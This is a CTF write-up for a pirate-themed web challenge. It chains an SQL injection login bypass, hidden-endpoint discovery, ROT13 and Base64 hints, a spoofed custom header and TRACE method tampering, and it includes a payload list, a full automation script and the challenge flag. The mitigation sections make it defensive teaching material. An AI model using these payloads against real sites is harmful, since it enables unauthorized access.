# Bypass CTF Challenge Writeup : The Lost Log Book 

## Challenge Description
> Sail into unsafe waters where faulty authentication and obscured routes guard valuable secrets. There's more than meets the eye in this pirate portal — hidden methods await those bold enough to look past the browser's limits.

## Challenge Overview

This is a web security challenge involving:
- SQL Injection authentication bypass
- Directory enumeration
- Custom HTTP headers
- ROT13 cipher decoding
- HTTP verb tampering (TRACE method)
- Access control vulnerabilities

The challenge presents a pirate-themed web portal with multiple layers of security that must be bypassed to access the captain's hidden logbook.

## Reconnaissance & Initial Analysis

### Challenge Hints Decoded

The challenge description contains important clues:
- **"faulty authentication"** → SQL injection or weak authentication
- **"obscured routes"** → Hidden directories and paths
- **"more than meets the eye"** → Information in headers, hidden data
- **"hidden methods"** → HTTP methods beyond GET/POST
- **"past the browser's limits"** → Use tools like curl, Burp Suite

### Directory Enumeration

First, we need to discover available endpoints. Using `gobuster` or `dirb`:

```bash
gobuster dir -u http://target-url.com -w /usr/share/wordlists/dirb/common.txt
```

**Discovered Directories:**
- `/login` - Authentication page
- `/dashboard` - Protected dashboard area
- `/Admin` - Administrative section
- `/session` - Session management
- `/logbook` - Target location (discovered later)

## Phase 1: Authentication Bypass via SQL Injection

### Vulnerability Discovery

Accessing the `/login` page, we test for SQL injection by entering a single quote (`'`) in the password field.

**Result**: Database error is displayed, confirming SQL injection vulnerability!

```
Error: SQL syntax error near '...'
```

This reveals that user input is directly inserted into SQL queries without sanitization.

### Exploitation

Using a classic SQL injection authentication bypass payload:

**Username:** `admin`  
**Password:** `admin' OR '1'='1' --`

This payload:
- Closes the password string with `'`
- Adds `OR '1'='1'` which is always true
- Comments out the rest of the query with `--`

**Resulting SQL Query:**
```sql
SELECT * FROM users WHERE username='admin' AND password='admin' OR '1'='1' --'
```

The query always evaluates to true, bypassing authentication!

**Success**: We're logged in as "Jack" and redirected to `/dashboard`.

### Alternative SQL Injection Payloads

```sql
' OR 1=1--
admin'--
' OR 'a'='a
admin' OR '1'='1' --
') OR ('1'='1
```

## Phase 2: Dashboard Exploration

### Available Features

The dashboard displays:
- Welcome message: "Welcome, Jack!"
- **"Secret Hold"** button
- **"Captain's Logbook"** button

### Initial Attempts

1. **Captain's Logbook** → Returns `403 Forbidden`
2. **Secret Hold** → Allows interaction

### Discovering Hidden Routes

Clicking **"Fetch Treasure Map"** in the Secret Hold section and monitoring traffic with Burp Suite reveals a new endpoint:

```
GET /admin/treasure-map
```

This is an "obscured route" that wasn't discovered during initial enumeration!

## Phase 3: Custom Header Discovery & ROT13 Decoding

### Testing the Treasure Map Endpoint

Making a standard GET request to `/admin/treasure-map`:

```bash
curl http://target-url.com/admin/treasure-map
```

**Response:**
```json
{
  "error": "Access Denied",
  "comment": "Zvffvat K-Cvengr urnqre."
}
```

### Decoding the Hint

The `comment` field looks like gibberish but follows a pattern. It's encoded with **ROT13** cipher!

ROT13 is a simple letter substitution cipher that shifts each letter 13 positions in the alphabet:
- A ↔ N
- B ↔ O
- M ↔ Z

**Decoding "Zvffvat K-Cvengr urnqre.":**

```python
import codecs
encoded = "Zvffvat K-Cvengr urnqre."
decoded = codecs.decode(encoded, 'rot_13')
print(decoded)
```

**Result:** `"Missing X-Pirate header."`

### Finding the Correct Header Value

We now know we need to include an `X-Pirate` header, but what value?

**Attempts:**
```bash
# Try 1: Boolean value
curl -H "X-Pirate: true" http://target-url.com/admin/treasure-map
# Result: Still denied

# Try 2: Captain role
curl -H "X-Pirate: Captain" http://target-url.com/admin/treasure-map
# Result: Still denied

# Try 3: The username from welcome message
curl -H "X-Pirate: Jack" http://target-url.com/admin/treasure-map
# Result: Success!
```

**Response:**
```json
{
  "map": "VHJhY2UgbG9nYm9vaw=="
}
```

### Decoding the Map

The value is Base64 encoded:

```bash
echo "VHJhY2UgbG9nYm9vaw==" | base64 -d
```

**Result:** `Trace logbook`

This is a crucial hint pointing to:
1. The **TRACE** HTTP method
2. The `/logbook` endpoint

## Phase 4: HTTP Verb Tampering (TRACE Method)

### Understanding TRACE

The TRACE HTTP method is designed for debugging and diagnostics:
- It echoes back the exact request received by the server
- Can leak sensitive headers and cookies
- Often disabled in production but sometimes overlooked

### The Exploit

Armed with our knowledge:
- Custom header: `X-Pirate: Jack`
- HTTP method: `TRACE`
- Target: `/logbook`

**Execute the attack:**

```bash
curl -X TRACE \
     -H "X-Pirate: Jack" \
     http://target-url.com/logbook
```

**Alternative using Burp Suite:**
1. Intercept any request
2. Change the method to `TRACE`
3. Change the path to `/logbook`
4. Add header: `X-Pirate: Jack`
5. Forward the request

**Success! The flag is revealed:**

```json
{
  "logbook": "Captain's private entries...",
  "flag": "BYPASS_CTF{D0nt_trust_a11}"
}
```

## Complete Exploitation Script

Here's a Python script that automates the entire exploitation:

```python
#!/usr/bin/env python3
import requests
import base64
import codecs

TARGET = "http://target-url.com"

print("🏴‍☠️ The Lost Log Book - CTF Exploit")
print("=" * 60)

# Step 1: SQL Injection Login
print("\n[1] Bypassing authentication with SQL injection...")
login_data = {
    "username": "admin",
    "password": "admin' OR '1'='1' --"
}
session = requests.Session()
response = session.post(f"{TARGET}/login", data=login_data)
print(f"    Status: {response.status_code}")
print("    Logged in as: Jack")

# Step 2: Access treasure map
print("\n[2] Accessing treasure map...")
response = session.get(f"{TARGET}/admin/treasure-map")
comment = response.json().get("comment", "")
print(f"    Encoded comment: {comment}")

# Decode ROT13
decoded_comment = codecs.decode(comment, 'rot_13')
print(f"    Decoded: {decoded_comment}")

# Step 3: Fetch map with X-Pirate header
print("\n[3] Fetching map with X-Pirate header...")
headers = {"X-Pirate": "Jack"}
response = session.get(f"{TARGET}/admin/treasure-map", headers=headers)
map_b64 = response.json().get("map", "")
print(f"    Base64 map: {map_b64}")

# Decode Base64
map_decoded = base64.b64decode(map_b64).decode()
print(f"    Decoded: {map_decoded}")

# Step 4: Use TRACE method on logbook
print("\n[4] Using TRACE method on /logbook...")
response = session.request(
    method="TRACE",
    url=f"{TARGET}/logbook",
    headers={"X-Pirate": "Jack"}
)

flag = response.json().get("flag", "")
print("\n" + "=" * 60)
print(f"🏆 FLAG: {flag}")
print("=" * 60)
```

## Flag
```
BYPASS_CTF{D0nt_trust_a11}
```

The flag message "Don't trust all" is fitting, as the challenge teaches us not to trust:
- Client-side validation
- Default HTTP methods
- Custom headers without proper validation
- User input without sanitization

## Vulnerabilities Exploited

### 1. **SQL Injection (Authentication Bypass)**

**Vulnerability:**
```php
// Vulnerable code
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

**Fix:**
```php
// Use parameterized queries
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password_hash]);
```

### 2. **Information Disclosure**

**Issues:**
- Database errors exposed to users
- ROT13 hints in responses (security by obscurity)
- Clear hints about required headers

**Fix:**
- Use generic error messages
- Log detailed errors server-side only
- Don't provide hints about security mechanisms

### 3. **Insecure HTTP Methods (TRACE Enabled)**

**Vulnerability:**
```
The TRACE method is enabled, allowing:
- Request echoing
- Header leakage
- Cross-site tracing (XST) attacks
```

**Fix:**
```apache
# Apache configuration
TraceEnable off

# Nginx configuration
# TRACE is disabled by default in nginx
```

### 4. **Weak Authorization Controls**

**Issues:**
- Custom header `X-Pirate` can be easily spoofed
- No server-side session validation
- Trust in client-provided values

**Fix:**
```python
# Proper authorization
def check_authorization(request):
    session = get_server_session(request.cookies)
    if not session or not session.is_admin:
        return 403, "Forbidden"
    return process_request()
```

### 5. **Insufficient Input Validation**

**Issues:**
- No input sanitization on login form
- Direct SQL query construction from user input

**Fix:**
```python
# Always validate and sanitize
def sanitize_input(user_input):
    # Remove special characters
    # Validate against whitelist
    # Use parameterized queries
    pass
```

## Tools Used

### Essential Tools

1. **Burp Suite**
   - Intercept HTTP traffic
   - Modify requests (method, headers)
   - View hidden requests from JavaScript

2. **curl**
   - Test endpoints directly
   - Add custom headers
   - Use non-standard HTTP methods

3. **gobuster/dirb**
   - Directory enumeration
   - Discover hidden paths

4. **CyberChef** (online)
   - ROT13 decoding
   - Base64 decoding
   - Multiple encoding/decoding operations

### Command Reference

```bash
# Directory enumeration
gobuster dir -u http://target.com -w wordlist.txt

# SQL injection test
curl -d "username=admin&password=test'" http://target.com/login

# Custom headers
curl -H "X-Pirate: Jack" http://target.com/endpoint

# TRACE method
curl -X TRACE -H "X-Pirate: Jack" http://target.com/logbook

# Base64 decode
echo "VHJhY2UgbG9nYm9vaw==" | base64 -d

# ROT13 decode
echo "Zvffvat K-Cvengr urnqre." | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

## Attack Chain Summary

```
1. Discover login page
   ↓
2. SQL injection bypass (admin' OR '1'='1'--)
   ↓
3. Access dashboard as "Jack"
   ↓
4. Discover /admin/treasure-map endpoint
   ↓
5. Decode ROT13 hint → "Missing X-Pirate header"
   ↓
6. Add X-Pirate: Jack header
   ↓
7. Receive Base64 map → Decode to "Trace logbook"
   ↓
8. Use TRACE method on /logbook with X-Pirate header
   ↓
9. Retrieve flag: BYPASS_CTF{D0nt_trust_a11}
```

## Key Takeaways

### For CTF Players (us)

1. **Always Enumerate Thoroughly**: Hidden paths and methods are common in web challenges

2. **Test for SQL Injection**: Try simple payloads like `'` to check for database errors

3. **Monitor All Traffic**: Use Burp Suite to catch hidden API calls and endpoints

4. **Decode Everything**: ROT13, Base64, hex—always decode suspicious strings

5. **Try All HTTP Methods**: GET, POST, PUT, DELETE, PATCH, OPTIONS, TRACE, HEAD

6. **Custom Headers Matter**: Check responses for hints about required headers

7. **Follow the Clues**: Challenge descriptions often contain hints about exploitation techniques
